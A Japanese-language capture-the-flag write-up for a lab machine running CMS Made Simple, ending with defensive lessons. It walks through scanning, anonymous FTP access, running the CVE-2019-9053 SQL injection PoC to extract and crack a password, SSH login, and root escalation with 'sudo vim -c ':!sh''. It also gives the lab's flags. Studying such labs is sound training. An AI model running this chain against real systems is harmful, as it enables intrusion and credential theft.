#以下はsimple ctfを解くときの軌跡を記録する

## **1　How many services are running under port 1000?**  
  ・ポート番号を調べるため、  
  nmap -sV IP　を試行。（実務を想定し、常にバージョン調査まで行うことを意識する）  
<details>
<summary>nmap -sV IP 結果</summary>

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-31 21:23 EDT
Nmap scan report for 10.49.146.66
Host is up (0.35s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
</details>

⇒上記結果から1000以下のポートの数を”2”と回答  
## 2 **What is running on the higher port?**  
⇒上記結果から”ssh”と回答  

## 3 **What's the CVE you're using against the application?**  
<ins>上記結果から調査順を1.ftp、2.http、3.sshとする。</ins>  
ftp IP ユーザ名をAnonymousで調査  
　⇒つながったがlsの結果が返ってこなかった。  
<details>
<summary>FTP調査</summary>

```text
ftp> ls
229 Entering Extended Passive Mode (|||49297|)
⇒ポート49297に接続できていないということが分かった。（原因はファイアウォールが閉じているからかも？EPSVという受け渡し法が壊れている可能性もあり）

⇒しかし侵入できているため、下記コマンドで対処

ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
…
ftp> get ForMitch.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
100% |***********************************************************|   166      148.86 KiB/s    00:00 ETA
226 Transfer complete.

⇒ローカル上にtxtファイルを転送した。
　⇒しかし、中身を見るに今問いに関係がなさそうのため、保留

cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user,
 and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```
</details>

・httpの調査に取り掛かる  
　⇒gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt にてディレクトリ探査  

 <details>
<summary>http調査</summary>

```text
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -t 20
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://IP
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 301]
/simple               (Status: 301) [Size: 315] [--> http://10.49.169.156/simple/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

⇒statusが300台から調査する
　URLが記載されているため、Kali linuxに標準装備されているFire Foxを利用

CMS Made Simple  2.2.8であることが判明
コマンドラインにて以下を実行
searchsploit CMS Made Simple 2.2.8
                                                   
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                              | php/webapps/46635.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
</details>

⇒http調査の結果、Pathに記載のある　php/webapps/46635.py　の46635(exploit-db iD)を利用して、  
　WebからCVEを特定する  
 　その結果**CVE-2019-9053**と判明したため、回答。

## 4 **What's the password?**

⇒HTTP調査の結果より、脆弱性の種類は SQLI (SQL Injection) と判明した。

## 5 **What's the password?**

⇒脆弱性とPOCが判明したため、実際に動かしていく  
　が、この46635.pyファイルが2.x用であったため、これを3.x用にしなければならない

 ⇒しかし、kaliのOSの中核であるpythonを削除したり上書きすると壊れてしまう。  
 　そのため、pyenv（pythonバージョンの共存）を環境で使えるようにする。（別の部屋を追加するイメージ）

・bashrcの内容にpyenvを使えるようPATHとかを追加していたがずっとエラーがはかれた  
⇒何度も/etc/skel/bashrcから初期化したがなおらず  
⇒そもそもkali linuxはbashシェルじゃなくてzshシェルを使っていることが分かった(echo $SHELLより)  
そのためpyenvの設定をzshrcに記載した

<details>
<summary>46635.pyを3.x用に変換する際にものすごく詰まったため、何をやったかを記載</summary>

```text
内容を完全に理解できているとはいいがたいが、
pyenvを利用して3.11.9のバージョンを共存させた
それをpython3 -m lib2to3 -w 46635.py で3.11用に変換した
（python3はlib2to3がある親ディレクトリ）
そのままでは使えないため、手動で修正を試みたのだが、ここで詰まった
最終的な原因としてはインデントのずれ、と推測
:set expandtabや:retabを使ったりしてインデントをそろえた
が、いろいろと修正しているため絶対にこれ!とはいえない

注)　一時的に3.11.9を有効化しているため、今後使用する際には
　　　pyenv shell 3.11.9　を実行すること
```
</details>

python2の46635.pyをpython3に変更し終えたら以下コマンドで実行
python3 46635.py -u http://IP | less
（テキストファイル出力、less出力しないと空行が大量生成されて見づらいため）
⇒しかし、スクリプトが毎回画面クリアをしているため
　以下のような返答が来る
 <details>
<summary>46635.py実行結果</summary>

```text
c
[*] Try: 1
c
```
</details>

⇒上記結果は、URLをちゃんと脆弱性のあるパスまで指定していないことが原因と判明

python3 46635.py -u http://IP/simple/ > sqli.txt  
にて結果をテキストに出力させる  

[+] Salt for password found: ハッシュ  
[+] Username found: xxx  
[+] Email found: xxx  
[+] Password found: ハッシュ  

といった結果が複数出力されるため、一番最後の  
Salt for password found  
Password found  
のみファイル保存  
⇒そのためハッシュ値:ハッシュ値という形にしてjohn実行

johnの実行  
john --wordlist=/usr/share/wordlists/rockyou.txt sqli1.txt  
⇒これでは不正確
今回はSaltありのMD5のため--format=dynamic_0をつけて実行（Saltなしは--format=raw-md5）
※MD5かどうかの判断基準は32文字の0-9,a-fのみ使われている（16進数）のが確認できること

john --format=dynamic_0 --incremental=Alnum --min-length=3 --max-length=6 sqli1.txt  
で実行してもだめだった  
　⇒adminユーザでハッシュを抜いていないのではないかと推測  
 　⇒調査の結果PoCでハッシュ値を向く対象がadminでない判明
  　⇒普遍的にadminを指定するようスクリプトを修正  
   　⇒0x31をadmin%にするため"echo -n admin% | xxd -p"にてハッシュ値取得  
    （0x31 = ASCII の “1”、SQLのなかではuser_id LIKE '1'と扱われる）

<details>
<summary>調査の結論</summary>

```text
上記FTPからgetした内容と組み合わせると、
FTPの内容：CTFの傾向から「Mitch」というシステムユーザ(Linux に実在する OS アカウント（SSH でログインできるユーザを含む全部)が存在、same pass the system userから特定のユーザと同じパスワードを設定している
＝Mitchがadminと同じパスワードを持っている

自分が思っていた攻略は
1 SQLi で admin のハッシュを抜く
2 それを John に渡す
3 John が割る
4 admin が出てくる
5 そのパスワードで mitch に SSH
だが、PoCの動作として
SQLi で admin の salt と hash を抜く

⇒最初に実行したスクリプト修正前の結果で問題はなかった。（adminを指定して抽出しないでよかった）

☆johnを使ってclackしようとしたのが間違い

johnは形式がわかっているハッシュなら割れる
今回はCMSMS特有のフォーマットため、PoCにワードリストを指定して割らなくてはならない

--以下はPoCに書いてある--
hash = md5(salt + word)
if hash == target_hash:
    print("Password found:", word)

hash = md5(salt + password)というのはjohnが割れるmd5(password) の形式と一致しない
⇒johnでは割れない。ということがわかる

じゃあどうやって割るのか
python3 46635.py -h        
Usage: 46635.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri (ex. http://10.10.10.100/cms)
  -w WORDLIST, --wordlist=WORDLIST
                        Wordlist for crack admin password
  -c, --crack           Crack password with wordlist

これを見るに、-c,--crackで割れると記載されている

つまり、今回の脆弱性のPoCは出力するハッシュ値が特殊である。johnで割れず辞書指定して-c,--crackで割る。
⇒それでも割れなかった。エンコードがUTF-8じゃないといわれて、そこも修正したが割れなかった。

そもそもadminでをるという考えはあっているのではないかと推測  
それにURLが間違っているのではないかと考え、PoC内部を調査したところ、
/moduleinterface.php?mact=News,m1_,default,0 ⇒調査対象のCMSの内部API（内部処理）をたたいてる   
つまりhttp://IP//simpleまで指定であっていた。

また、今までpython3で実行していたが、lib2to3を使用して文字列の修正やエンコードの修正だけでなく、
そのほかにもいろいろと修正しなければならなかったため、時間を考え最終的にpython2で実行した。

Python2 用の termcolorが入っていなかったのでwgetで取得しインストールした。  
以下python2でのクラックコマンドとその結果  
python2 46635.py -u http://10.49.141.85/simple --crack -w /usr/share/wordlists/rockyou.txt  
[+] Salt for password found: 1dac0d92e9fa6bb2  
[+] Username found: mitch  
[+] Email found: admin@admin.com  
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96  
[+] Password cracked: secret  

```
</details>

上記結果より、secretと回答


## 6 **Where can you login with the details obtained?**  
問１で調査したnmap結果からsshと回答  
ssh -p 2222 mitch@IP (ポート指定しないとつながらない)　
※ポート指定しないとデフォルトの22につなごうとしてしまう  

## 7 **What's the user flag?**
問6で侵入後、lsした際にuser.txtがあったため、それをcatした。  
$ cat user.txt  
G00d j0b, keep up!  

## 8 **Is there any other user in the home directory? What's its name?**  
$ cd /home  
$ ls -l  
total 8  
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch  
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath     
上記コマンド結果よりsunbathと回答。  

## 9 **What can you leverage to spawn a privileged shell?**
権限昇格するために初めにsudo -l を実施  
結果  
(root) NOPASSWD: /usr/bin/vim  
vimがroot権限で動かせれることを確認できたため、vimと回答

## 10 **What's the root flag?**
sudo vimでエディタが開いた後に:!sh  
もしくは　sudo vim -c ':!sh'  
をすることでroot昇格  
<details>
<summary>コマンド結果</summary>

```text
$ sudo vim -c ':!sh'

# ^[[2;2R^C
# 
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```
</details>

## 11 **まとめ**
今回のCTFで発見した脆弱性は以下の通り
・FTPポートが開いていたこと
・FTPの設定ファイルのユーザ名がAnonymousであったこと（デフォルト値から変更していない）
・不用意な（パスワードのヒントになりうるような）テキストファイルが残されていたこと
・CVE2019-9053という既知の脆弱性に対処していなかったこと
・構築または運用における利便性からvimコマンドに所有者権限がわたっていたこと（最小権限の原則の無視）
があげられる。
これらから、  
運用環境において利便性というものは大事だが、本番環境ではそれらは控えるべき。  
またコンフィグファイルにデフォルトの設定値が残っていたことから不要な設定値は削除しておくのと、不要なポートを開放しておかないことが重要だと理解。  
CVE2019-9053の対策について、バージョンをあげるのが最善策ではあるが、運用環境ではそれができないのが実情。
次善策として攻撃対象であるmoduleinterface.phpへの外部アクセスの制御（IP制限やWAFによる遮断）をすること。  
原因であるNews モジュールが使用されていないのであれば、それを無効化することで対策ができる。　
